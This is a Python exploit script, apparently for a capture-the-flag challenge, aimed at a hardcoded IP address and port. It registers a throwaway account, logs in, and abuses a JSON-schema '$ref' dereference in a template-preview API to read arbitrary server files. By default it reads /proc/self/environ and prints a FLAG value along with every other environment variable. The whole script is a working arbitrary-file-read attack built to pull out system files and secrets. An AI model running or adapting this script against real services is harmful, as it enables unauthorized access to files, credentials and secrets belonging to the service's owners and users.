import sys
import json
import urllib.request
import urllib.error
import http.cookiejar
import os

TARGET = "http://39.105.213.28:12606"


def make_opener():
    """Create urllib opener with cookie support."""
    cj = http.cookiejar.CookieJar()
    handler = urllib.request.HTTPCookieProcessor(cj)
    return urllib.request.build_opener(handler)


def api(opener, ep, data):
    """Send POST request with JSON body."""
    url = TARGET + ep
    body = json.dumps(data).encode()
    headers = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        url, data=body, headers=headers, method="POST"
    )
    try:
        resp = opener.open(req)
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return json.loads(e.read().decode())


def register(opener, u, p):
    return api(opener, "/api/register",
               {"username": u, "password": p})


def login(opener, u, p):
    return api(opener, "/api/login",
               {"username": u, "password": p})


def preview(opener, schema):
    return api(opener, "/api/template/preview",
               {"schema": schema})


def read_file(opener, path):
    """Read arbitrary file via $ref dereference."""
    payload = {
        "type": "object",
        "properties": {"x": {"$ref": path}}
    }
    r = preview(opener, payload)
    if r.get("ok"):
        return r["preview"]["properties"]["x"]
    # fallback
    r2 = preview(opener, {"$ref": path})
    if r2.get("ok"):
        return r2["preview"]
    return None


def main():
    path = sys.argv[1]         if len(sys.argv) > 1         else "/proc/self/environ"
    suffix = os.urandom(4).hex()
    username = "pwn_" + suffix
    password = "pwn123"

    opener = make_opener()
    register(opener, username, password)
    login(opener, username, password)
    print("[+] Logged in as:", username)

    data = read_file(opener, path)
    if data is None:
        print("[-] Read failed")
        sys.exit(1)

    if path == "/proc/self/environ"             and isinstance(data, str):
        for pair in data.split("\x00"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                if k == "FLAG":
                    print("[+] FLAG:", v)
                else:
                    print("   ", k, "=", v)
    else:
        s = str(data)
        print(s[:2000] +
              ("..." if len(s) > 2000 else ""))


if __name__ == "__main__":
    main()
